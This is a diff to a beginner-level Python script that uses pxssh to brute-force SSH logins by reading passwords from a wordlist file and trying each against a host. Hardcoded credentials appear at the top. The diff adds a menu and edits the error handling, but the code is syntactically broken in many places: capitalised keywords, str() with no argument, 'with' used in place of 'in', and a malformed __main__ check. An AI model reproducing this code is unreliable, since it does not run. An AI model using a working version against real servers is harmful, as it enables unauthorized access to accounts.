@@ -16,12 +16,36 @@ import pxssh
 import argparse
 
 
+# variables 
 host = "ip address"
 user = "spyguy"
 password = "123456"
 
 
- Fails = 0
+# menu 
+Def usr_menu():
+usr_choice = ("""
+
+Choose your mode:
+1.password check
+2.password validation 
+3.ssh login
+4.Exit
+
+""")
+
+If(usr_choice == 3):
+    Connect()
+else:
+    exit()
+
+
+
+# Fail attempts 
+Fail = 0
+
+
+
 def connect(host,user,password):
 
     try:
@@ -29,17 +53,18 @@ def connect(host,user,password):
         s.login(host,user,password)
         print(" Sucessful connection ")
         return self
-    except Exceptions, e:
+
+    except Exceptions:
         if Fails > 5:
             print("To many failed attemps")
-            exit(0)
+            exit()
 
-        elif 'read_nonblocking' in str(e):
+        elif 'read_nonblocking' in str():
             Fails =+ 1
             time.sleep(3)
             return connect(host,user,password)
 
-        elif 'syncronize with original prompt' with str(e):
+        elif 'syncronize with original prompt' with str():
             time.sleep(1)
             return connect(host,user,password)
         return None
@@ -51,7 +76,7 @@ def Main():
 
 
     if args.host:
-        with open(args.file, 'r') as infile:
+        with open(args.passwd.txt, 'r') as infile:
             for line in infile:
                 password = line.strip('\r\n')
                 print('testing: ', = str(password))
@@ -60,12 +85,12 @@ def Main():
                     print('connection made')
 
     else:
-        exit(0)
+        exit()
 
 if __name__ '__main__':
     Main()
     
     
     
-    resourse: https://www.youtube.com/watch?v=aL4uckPsq7g
+resourse: https://www.youtube.com/watch?v=aL4uckPsq7g
     
